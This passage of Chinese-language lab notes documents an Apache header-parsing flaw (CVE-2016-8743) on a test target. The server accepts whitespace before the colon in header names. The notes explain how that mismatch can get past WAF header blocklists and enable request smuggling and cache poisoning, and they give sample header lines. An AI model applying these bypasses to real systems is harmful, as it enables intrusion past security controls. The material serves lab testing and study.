| 3 | `X-Test\t: abc`（冒号**前**制表符） | **`200 OK`** |
| 4 | `Host : x`（连 `Host` 头都行） | **`200 OK`** |
| 对照 | `X-Test:abc` / `X-Test:   abc`（冒号后 0 / 3 个空格） | `200 OK`（规范本来就允许） |

靶机：`Apache/2.4.10 (Debian)` + `PHP/5.5.38`

### 规范怎么说

**RFC 7230 §3.2.4**：

> No whitespace is allowed between the header field-name and colon. …
> A server **MUST** reject any received request message that contains whitespace
> between a header field-name and colon with a response code of **400**.

| 位置 | 规范 | 靶机实测 |
|---|---|---|
| 冒号**后**空白 | 允许（OWS，可有可无） | 0 / 1 / 3 个空格都 200 |
| 冒号**前**空白 | **禁止，服务器必须回 400** | **全部 200** ← 规范与实现的偏差 |

### 这不是随便一个 bug，是有编号的

**[CVE-2016-8743](https://security-tracker.debian.org/tracker/CVE-2016-8743)**（2016-12 公开）

- 影响：Apache **2.2.0 ~ 2.4.23**
- 修复：**2.4.25**
- 原文风险：… may result in **request smuggling、response splitting、cache pollution**

> 光看横幅判断不了：`Server: Apache/2.4.10` 只报到小版本，
> Debian 打过补丁的包（`2.4.10-10+deb8u8`）**也会拒绝**。**只能实测。**

### 为什么有价值

**规范与实现的偏差 = 双解析差异 = 绕过。**

```
     你  ──▶  WAF  ──▶  后端
               ↑
        「X-Test」和「X-Test 」在这里是不是同一个头？
```

| 谁怎么看 | 结果 |
|---|---|
| WAF 按规范解析 | 它可能把 `X-Test : abc` 里的空格当分隔符，看到的头名是 `X-Test` |
| 后端 Apache 宽容解析 | 它看到的头名是 `X-Test `（**带空格**） |
| 两边不一致 | **WAF 拦的那个头，和你实际打进去的不是同一个** |

**可用的场景**：

- 头名加空格 → 绕 WAF 的头名黑名单（WAF 盯 `X-Forwarded-For`，你发 `X-Forwarded-For :`）
- **请求走私**（前后端对请求边界的理解不同）
- **缓存污染**（缓存键算的头名 ≠ 后端认的头名）

### 和 A6 的区别（别混）

| 附录 | 讲什么 | 结论 |
|---|---|---|
| **A6** | 头名 / 媒体类型值的**大小写** | 不敏感，四种写法都通 |
| **A7**（本节） | 头名和冒号之间的**空白** | 规范禁止，**这台靶机不执行** |

两者都是「规范与实现的偏差」，但**触发点不同**：A6 是**大小写**，A7 是**空白**。
